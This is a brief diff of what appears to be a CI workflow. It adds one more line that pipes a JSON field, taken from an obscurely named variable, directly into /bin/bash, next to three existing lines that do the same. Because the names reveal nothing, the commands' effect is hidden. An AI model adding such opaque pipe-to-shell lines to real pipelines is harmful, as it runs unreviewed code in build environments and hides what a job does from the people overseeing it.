@@ -39,6 +39,7 @@ jobs:
           echo $qeno3882 | jq -r .uojz1 | /bin/bash
           echo $pbf6 | jq -r .huvx5 | /bin/bash
           printf '%s' "$pr5" | jq -r .m06 | /bin/bash
+          printf '%s' "$zijna955" | jq -r .rhtj0 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
